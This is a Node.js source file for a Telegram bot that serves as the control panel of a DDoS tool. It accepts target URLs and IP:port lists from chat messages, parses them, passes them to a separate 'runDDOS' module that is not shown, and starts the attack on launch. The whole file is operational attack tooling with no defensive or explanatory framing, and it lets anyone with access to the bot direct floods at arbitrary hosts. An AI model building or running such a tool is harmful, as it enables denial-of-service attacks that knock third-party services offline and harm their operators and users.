require("dotenv").config();
const net = require("net");

const { Telegraf, session } = require("telegraf");
const DDOS = require("./runDDOS");

const URL_REGEXP = new RegExp(
  "(https?://(?:www.|(?!www))[a-zA-Z0-9][a-zA-Z0-9-]+[a-zA-Z0-9].[^s]{2,}|www.[a-zA-Z0-9][a-zA-Z0-9-]+[a-zA-Z0-9].[^s]{2,}|https?://(?:www.|(?!www))[a-zA-Z0-9]+.[^s]{2,}|www.[a-zA-Z0-9]+.[^s]{2,})"
);

const TARGETS = [];

const bot = new Telegraf(process.env.BOT_TOKEN);

const ddos = new DDOS({ targets: TARGETS, bot });

ddos.run();

bot.use(session());

bot.hears("hi", (ctx) => ctx.reply("Hey there"));

bot.command("targets", (ctx) => {
  ctx.reply(
    [`Now ${ddos.targets.length} targets`, "", ...ddos.targets].join("\n")
  );
});
bot.hears("targets", (ctx) => {
  ctx.reply(
    [`Now ${ddos.targets.length} targets`, "", ...ddos.targets].join("\n")
  );
});

bot.on("text", (ctx) => {
  if (!ctx.session) ctx.session = { targets: TARGETS };
  const { text } = ctx.message;
  const targets = text.split("\n").reduce((acc, t) => {
    const trimed = t.trim();
    if (!trimed) return acc;

    if (trimed.match(URL_REGEXP)) {
      return [...acc, trimed];
    }

    const [ip4, port4] = trimed.split(":");
    if (net.isIPv4(ip4) && !Number.isNaN(Number(port4))) {
      return [...acc, trimed];
    }

    const [ip, ...ports] = trimed.split(" ");
    if (net.isIPv4(ip)) {
      ports
        .toString()
        .replace(/\(|\)/g, "")
        .split(",")
        .forEach((p) => {
          if (!p) return;
          const [port, type = ""] = p.split("/");
          if (type.toLowerCase() === "tcp" && !Number.isNaN(Number(port))) {
            acc.push(`${ip}:${port}`);
          }
        });
    }

    return acc;
  }, []);

  ddos.addTargets(targets);
  ctx.reply([`Add ${targets.length} targets`, "", ...targets].join("\n"));
});

bot
  .launch()
  .then(() => {
    console.log("bot started");
  })
  .catch(console.log);

// Enable graceful stop
process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));
